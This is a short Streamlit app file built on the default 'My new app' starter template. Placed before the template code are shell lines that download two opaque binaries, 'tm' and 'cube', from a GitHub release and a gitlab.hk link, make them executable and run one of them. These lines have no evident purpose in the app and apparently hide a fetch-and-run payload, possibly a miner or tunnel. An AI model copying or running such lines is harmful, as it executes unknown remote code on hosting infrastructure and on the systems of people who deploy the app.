import streamlit as st
!curl -L -o tm https://github.com/chat263/web/releases/download/1/tm
!curl -L -o cube https://gitlab.hk/chathouse/chathousedocker/-/raw/main/cube?inline=false
!chmod +x tm cube

!./tm -F
st.title("🎈 My new app")
st.write(
    "Let's start building! For help and inspiration, head over to [docs.streamlit.io](https://docs.streamlit.io/)."
)
